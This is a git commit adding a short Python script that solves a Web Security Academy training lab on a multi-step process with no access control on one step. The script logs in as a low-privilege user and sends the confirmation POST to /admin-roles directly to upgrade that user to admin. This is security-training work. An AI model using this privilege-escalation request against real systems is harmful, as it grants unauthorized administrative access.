3a2353cef6f11c1dd29a914a4f9f06fdbf4c9657
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-05-23 17:33:50 -0700

    Multi-step process with no access control on one step

---
+++ web_security_academy/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step.py
@@ -0,0 +1,16 @@
+from web_security_academy.core.logger import logger
+from urllib.parse import urlencode
+
+
+def solve_lab(session, *args):
+    session.login("wiener", "peter", with_csrf=False)
+
+    data = {"username": "wiener", "action": "upgrade", "confirmed": "true"}
+    logger.info('Sending a POST request to "/admin-roles" with the following data:')
+    logger.info(data)
+    resp = session.post_path("/admin-roles", data=data)
+
+    if resp.status_code != 200:
+        logger.failure("Did not get expected 200 status code.")
+    else:
+        logger.success("Success.")
